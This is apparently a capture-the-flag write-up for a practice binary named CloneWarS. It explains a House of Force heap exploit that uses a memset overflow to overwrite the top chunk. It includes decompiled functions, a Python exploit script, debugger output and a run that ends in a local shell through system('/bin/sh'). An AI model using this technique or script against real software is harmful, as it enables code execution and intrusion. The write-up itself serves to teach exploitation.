# CloneWars

This binary teach us on how to take advantage of careless use of `memset`, the technique used here is House Of Force which is used to overwrite the `top_chunk` of the heap to force `malloc` to return an arbitary address which could be then overwritten.


# Reverse Engineering

Although the binary isn't stripped, this makes the reverse engineering process very easy. Let's see the functions which the binary contains, I'll filter out the important functions which is responsible for carrying out the house of force attack.

##### `prep_starship`

```C
unsigned __int64 prep_starship()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int c; // [rsp+8h] [rbp-28h]
  int v3; // [rsp+Ch] [rbp-24h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v1 = 0;
  fwrite("Master, the amount of starships: ", 1uLL, 0x21uLL, stderr);
  __isoc99_scanf("%d", &v1);
  starships = malloc(v1);
  c = 0;
  v3 = 0;
  fwrite("\nWhat kind of starships?: ", 1uLL, 0x1AuLL, stderr);
  __isoc99_scanf("%x", &c);
  fwrite("\nCapacity of troopers in the starships: ", 1uLL, 0x28uLL, stderr);
  __isoc99_scanf("%d", &v3);
  memset(starships, c, v3);
  return __readfsqword(0x28u) ^ v4;
}
```

Did you see it? Okay, so first we malloc a region by defining the amount of starships we want. Then we can give a character which can be defined as the kind of starship we want, after that we define the capacity of the troppers in the starships. Here's the catch, we `malloc`'d a region of size `32` then we give the any character, for example `B`which would be `0x42` then we give the capacity to something more than the `malloc`'d region and the `memset` will fill the memory region pointed to the heap region we allocated and fill that region by the character we give multiplied by number of times.

For example:-

```
Malloc'd region size: 32
Character           : 0x42
Size                : 0x40  // Overflow because the malloc'd region is only of size 32
```

We will see what would be the next step in the process of exploitation:-

##### `build_deathstar` 


```C
unsigned __int64 build_death_star()
{
  int v1; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  fwrite("Assemble death star: ", 1uLL, 0x15uLL, stderr);
  __isoc99_scanf("%d", &v1);
  malloc(v1);
  return __readfsqword(0x28u) ^ v2;
}
```

This will be used to force `malloc` to return the address we want since we can control the size of the `malloc`.

##### `cm2_dark_side`


```C
int cm2_dark_side()
{
  fprintf(stderr, "\nFile is at: %ld\n", file);
  return system(file);
}
```

This will just run the command pointed by the `file`.



##### `r2d2`

```C
unsigned __int64 R2D2()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
  fwrite("R2? ", 1uLL, 4uLL, stderr);
  __isoc99_scanf("%x", &v1);
  v2 = (char *)starships + 272;
  fprintf(stderr, "\nR2D2 IS .... %ld ...... ON THIS TRACK !! 0x6733894F08\n", (char *)starships + 272);
  getchar();
  return __readfsqword(0x28u) ^ v3;
}
```

So, this function is useful since this is used to print the Heap Address once `starship` is initialized, pay attention this function won't leak anything unless the `starship` initialized.



##### `deploy_troops`


```C
unsigned __int64 make_troopers()
{
  int v0; // ST0C_4
  char *dest; // ST10_8
  char src[8]; // [rsp+18h] [rbp-28h]
  char buf; // [rsp+20h] [rbp-20h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fwrite("\nTroopers to be deployed: ", 1uLL, 0x1AuLL, stderr);
  read(0, &buf, 0x14uLL);
  v0 = atoi(&buf);
  dest = (char *)malloc(v0);
  fwrite("\nWhat kind of troopers?: ", 1uLL, 0x19uLL, stderr);
  src[(signed int)((unsigned __int64)read(0, src, 8uLL) - 1)] = 0;
  strcpy(dest, src);
  return __readfsqword(0x28u) ^ v5;
}
````

This function just copies the data from the local variable `buf` to the dynamically allocated heap region.

# Exploitation


So, what we will do here is first create wrapper function to interact with the binary and then we can move on.

```py
from roppy import *


p = process("./CloneWarS")

def prepstarships(amount, ship_type, capacity):
    p.sendlineafter(": ", "3")
    p.sendlineafter(": ", str(amount))
    p.sendlineafter(": ", ship_type)
    p.sendlineafter(": ", str(capacity))


def r2d2():
	p.sendlineafter(": ", "2")
	p.sendlineafter("? ", "x")
	p.recvline()
	leak = p.recvline().split()[3]
	return int(leak)

def darkside():
	p.sendlineafter(": ", "6")
	p.recvline()
	leak = p.recvline().split(b": ")[1]
	return int(leak)

def build_deathstar(amount):
	p.sendlineafter(": ", "1")
	p.sendlineafter(": ", str(amount))

def maketroopers(amount, data):
	p.sendlineafter(": ", "4")
	p.sendlineafter(": ", str(amount))
	p.sendlineafter(": ", data)
```


This will help us interact with the different functionalities of the binary, so without further ado let's start.

### Leak Heap Address

First we need to leak the heap address so we could just calculate the top_chunk address which will be used later to get the arbitrary chunk we want to overwrite.


```py
prep_starship(0x24, "A", 0x24)
# Leak heap
heap = r2d2()
log.info("HEAP:     %s" %(hex(heap)))
```

We will get the heap address.


### Leak file pointer from BSS

Since `file` is stored in the BSS section and is being printed we can get the address of heap easily :)

```py
fptr = darkside()
log.info("FILE ptr: %s" %(hex(fptr)))
```

### Overwrite `top_chunk` with `FFFFF`

Must be wondering why with `FFFFF`? Well, this is the largest value an unsigned integer can hold so we need to make the `top_chunk` to make the heap think like it can return almost any address.


```py
# Overwriting the top chunk with `0xfffffffffff` making it large enough
prepstarships(0x24, "FF", 0x40)
```


### Calculate the distance from `top_chunk` to the `file`


This step is important because we need to know the differnce between the address of the `file` and `top_chunk`. So, what we do here is first get the difference between the `main_arena` and the `heap_base`

We first leak the heap address and then attach the process to the `gdb` and subtract the leaked address from the `top_chunk` address:-

```r
pwndbg> 
pwndbg> x/20xg &main_arena 
0x7f113dafbb20 <main_arena>:  0x0000000100000000  0x0000000000000000
0x7f113dafbb30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7f113dafbb40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7f113dafbb50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7f113dafbb60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7f113dafbb70 <main_arena+80>: 0x0000000000000000  0x000055af3f015060
0x7f113dafbb80 <main_arena+96>: 0x0000000000000000  0x00007f113dafbb78
0x7f113dafbb90 <main_arena+112>:  0x00007f113dafbb78  0x00007f113dafbb88
0x7f113dafbba0 <main_arena+128>:  0x00007f113dafbb88  0x00007f113dafbb98
0x7f113dafbbb0 <main_arena+144>:  0x00007f113dafbb98  0x00007f113dafbba8
pwndbg> x/20xg &main_arena Quit
pwndbg> p/x 0x55af3f015130 - 0x55af3f015080
$1 = 0xb0
pwndbg> p/x 0x55af3f015130 - 0x55af3f015060
$2 = 0xd0
pwndbg> c
```



```py
# Calculating the TOP_CHUNK address which will be subtracted from the fptr and then can
# be used with House Of Force
TOP_CHUNK = heap
TOP_CHUNK -= 0xd0   #Offset
TOP_CHUNK += 8 * 4  # This will exact return the 32 bytes, because the malloc has to get the address 32 bytes before the target so that we can get the target from the exact address
log.info("TOP CHUNK: 0x%x" %(TOP_CHUNK))

```


### Forcing `malloc` to get the target


Now since we overwritten the `top_chunk` now we can ask the `malloc` to return the address we want by giving the calcuated address, we calculate the address by:-

```py
size_to_malloc = target_addr - top_chunk_address
```

This will give us a negative integer and when we give it to the `malloc` it'll give us that chunk :D

```py
build_deathstar(fptr - TOP_CHUNK) # Subtracting and sending the offset, hence forcing the heap
```

### Saving `/bin/sh` to the target address

Now, we can save the `/bin/sh` to the target address since we forced malloc to return that specific address.

```py
p.sendlineafter(": ", "4")
p.sendlineafter(": ", "/bin/sh")
```


The `deploy_troops` will allocate a region from the heap and give it to the `dest` variable(see the function `prepare_troppers`) and we give the data to the `buf` it will copied to the malloc region.

### Trigger the `system("/bin/sh")`

Now, we will just trigger the `cm2_dark_side` to execute the `system("/bin/sh")`.

Hence we get the shell.

Runnin the exploit:-

```r
0 [13:54:24] vagrant@oracle(oracle) house_of_force> python3 CloneWarS.py 
[+] Starting program './CloneWarS': PID 5059
[*] HEAP:     0x55ce3e979130
[*] FILE ptr: 0x55ce3d056010
[*] TOP CHUNK: 0x55ce3e979080
[*] Switching to interactive mode

What kind of troopers?: 
 [1] Build Death Star
 [2] R2D2???????
 [3] Prepare Starships
 [4] Deploy Troopers
 [5] LIGHTSABERS XDXD
 [6] Come to the dark side...
 [7] Exit

Your choice: 
File is at: 94344275386384
$ whoami
vagrant
$ 
[*] Interrupted
[*] Stopped program './CloneWarS'

```